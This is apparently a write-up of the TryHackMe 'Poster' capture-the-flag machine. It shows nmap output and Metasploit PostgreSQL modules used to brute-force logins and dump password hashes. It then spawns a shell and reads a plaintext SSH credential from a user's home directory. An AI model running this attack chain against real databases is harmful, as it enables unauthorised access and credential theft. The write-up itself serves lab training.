# poster writeup
### platform : tryhackme
### diffeculty : easy
### author: Ali Amouz
## machine overview
this is an easy machine from tryhackme where we need to use metasploit auxialiries along with an exploit to get initial access .. 

## enumeration 
### nmap 
```
nmap -sC -sV 10.10.218.192 -o nmap/poster
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-28 11:50 EDT
Nmap scan report for 10.10.218.192
Host is up (0.11s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE    SERVICE    VERSION
22/tcp   open     ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 71:ed:48:af:29:9e:30:c1:b6:1d:ff:b0:24:cc:6d:cb (RSA)
|   256 eb:3a:a3:4e:6f:10:00:ab:ef:fc:c5:2b:0e:db:40:57 (ECDSA)
|_  256 3e:41:42:35:38:05:d3:92:eb:49:39:c6:e3:ee:78:de (ED25519)
80/tcp   open     http       Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Poster CMS
1081/tcp filtered pvuniwien
5432/tcp open     postgresql PostgreSQL DB 9.5.8 - 9.5.10 or 9.5.17 - 9.5.23
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=ubuntu
| Not valid before: 2020-07-29T00:54:25
|_Not valid after:  2030-07-27T00:54:25
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
the scan reveals 3 open ports ( ssh, http and postgre database)

based on the room : Metasploit contains a variety of modules that can be used to enumerate in multiple rdbms, making it easy to gather valuable information. 
so let us start metasploit and search for postgre auxilary that will allow us to enumerate users 
```
msf6 > search postgresql

Matching Modules
================

   #   Name                                                                                      Disclosure Date  Rank       Check  Description
   -   ----                                                                                      ---------------  ----       -----  -----------
   0   exploit/linux/http/acronis_cyber_infra_cve_2023_45249                                     2024-07-24       excellent  Yes    Acronis Cyber Infrastructure default password remote code execution
   1     \_ target: Unix/Linux Command                                                           .                .          .      .
   2     \_ target: Interactive SSH                                                              .                .          .      .
   3   auxiliary/server/capture/postgresql                                                       .                normal     No     Authentication Capture: PostgreSQL
   4   exploit/linux/http/beyondtrust_pra_rs_unauth_rce                                          2024-12-16       excellent  Yes    BeyondTrust Privileged Remote Access (PRA) and Remote Support (RS) unauthenticated Remote Code Execution
   5   post/linux/gather/enum_users_history                                                      .                normal     No     Linux Gather User History
   6   exploit/multi/http/manage_engine_dc_pmp_sqli                                              2014-06-08       excellent  Yes    ManageEngine Desktop Central / Password Manager LinkViewFetchServlet.dat SQL Injection
   7     \_ target: Automatic                                                                    .                .          .      .
   8     \_ target: Desktop Central v8 >= b80200 / v9 < b90039 (PostgreSQL) on Windows           .                .          .      .
   9     \_ target: Desktop Central MSP v8 >= b80200 / v9 < b90039 (PostgreSQL) on Windows       .                .          .      .
   10    \_ target: Desktop Central [MSP] v7 >= b70200 / v8 / v9 < b90039 (MySQL) on Windows     .                .          .      .
   11    \_ target: Password Manager Pro [MSP] v6 >= b6800 / v7 < b7003 (PostgreSQL) on Windows  .                .          .      .
   12    \_ target: Password Manager Pro v6 >= b6500 / v7 < b7003 (MySQL) on Windows             .                .          .      .
   13    \_ target: Password Manager Pro [MSP] v6 >= b6800 / v7 < b7003 (PostgreSQL) on Linux    .                .          .      .
   14    \_ target: Password Manager Pro v6 >= b6500 / v7 < b7003 (MySQL) on Linux               .                .          .      .
   15  auxiliary/admin/http/manageengine_pmp_privesc                                             2014-11-08       normal     Yes    ManageEngine Password Manager SQLAdvancedALSearchResult.cc Pro SQL Injection
   16  exploit/multi/postgres/postgres_copy_from_program_cmd_exec                                2019-03-20       excellent  Yes    PostgreSQL COPY FROM PROGRAM Command Execution
   17    \_ target: Automatic                                                                    .                .          .      .
   18    \_ target: Unix/OSX/Linux                                                               .                .          .      .
   19    \_ target: Windows - PowerShell (In-Memory)                                             .                .          .      .
   20    \_ target: Windows (CMD)                                                                .                .          .      .
   21  exploit/multi/postgres/postgres_createlang                                                2016-01-01       good       Yes    PostgreSQL CREATE LANGUAGE Execution
   22  auxiliary/scanner/postgres/postgres_dbname_flag_injection                                 .                normal     No     PostgreSQL Database Name Command Line Flag Injection
   23  auxiliary/scanner/postgres/postgres_login                                                 .                normal     No     PostgreSQL Login Utility
   24  auxiliary/admin/postgres/postgres_readfile                                                .                normal     No     PostgreSQL Server Generic Query
   25  auxiliary/admin/postgres/postgres_sql                                                     .                normal     No     PostgreSQL Server Generic Query
   26  auxiliary/scanner/postgres/postgres_version                                               .                normal     No     PostgreSQL Version Probe
   27  exploit/linux/postgres/postgres_payload                                                   2007-06-05       excellent  Yes    PostgreSQL for Linux Payload Execution
   28    \_ target: Linux x86                                                                    .                .          .      .
   29    \_ target: Linux x86_64                                                                 .                .          .      .
   30  exploit/windows/postgres/postgres_payload                                                 2009-04-10       excellent  Yes    PostgreSQL for Microsoft Windows Payload Execution
   31    \_ target: Windows x86                                                                  .                .          .      .
   32    \_ target: Windows x64                                                                  .                .          .      .
   33  auxiliary/admin/http/rails_devise_pass_reset                                              2013-01-28       normal     No     Ruby on Rails Devise Authentication Password Reset
   34  exploit/multi/http/rudder_server_sqli_rce                                                 2023-06-16       excellent  Yes    Rudder Server SQLI Remote Code Execution
   35  post/linux/gather/vcenter_secrets_dump                                                    2022-04-15       normal     No     VMware vCenter Secrets Dump


Interact with a module by name or index. For example info 35, use 35 or use post/linux/gather/vcenter_secrets_dump
```
we find postgres_login auxiliary ( 23) that will allow us to find the username and password , and all it need it to setup the rhost
creds found : 10.10.218.192:5432 - Login Successful: p*****:*****d@template1
now we are looking for another auxilary that will allow us to execute the username and admin we already found after many trials . it is number 25 
```
msf6 auxiliary(admin/postgres/postgres_sql) > set password password
password => password
msf6 auxiliary(admin/postgres/postgres_sql) > run
[*] Running module against 10.10.218.192
Query Text: 'select version()'
==============================

    version
    -------
    PostgreSQL 9.5.21 on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 5.4.0-6ubuntu1~16.04.12) 5.4.0 20160609, 64-bit

[*] Auxiliary module execution completed
```
just like this we get the version .. now we need to find a way to dump user hashes so we can use 
```
un
[+] Query appears to have run successfully
[+] Postgres Server Hashes
======================

 Username   Hash
 --------   ----
 darkstart  md58842b99375db43e9fdf238753623a27d
 poster     md578fb805c7412ae597b399844a54cce0a
 postgres   md532e12f215ba27cb750c9e093ce4b5127
 sistemas   md5f7dbc0d5a06653e74da6b1af9290ee2b
 ti         md57af9ac4c593e9e4f275576e13f935579
 tryhackme  md503aab1165001c8f8ccae31a8824efddc

[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/postgres/postgres_hashdump) > 
```
the next 2 questions can be answered from the search 

after the first foothold on the system. we need to spawn a shell since python is working ( so we can change directories)
````
python3 -c 'print(1)'  
1
python3 -c 'import pty;pty.spawn("/bin/bash")'    
postgres@ubuntu:/var/lib/postgresql/9.5/main$ cd ..
cd ..
postgres@ubuntu:/var/lib/postgresql/9.5$ cd /
cd /
postgres@ubuntu:/$ cd /home
cd /home
postgres@ubuntu:/home$ ls
ls
alison  dark
postgres@ubuntu:/home$ cd dark
cd dark
postgres@ubuntu:/home/dark$ ls
ls
credentials.txt
postgres@ubuntu:/home/dark$ cat credentials.txt
cat credentials.txt
dark:qwerty1234#!hackme
```
we got some intresting credintils form dark . so we can login via ssh 
( after login via ssh I have found out that the user dark does not have any intersting permissions on the server so we need to find a way to login as alison)

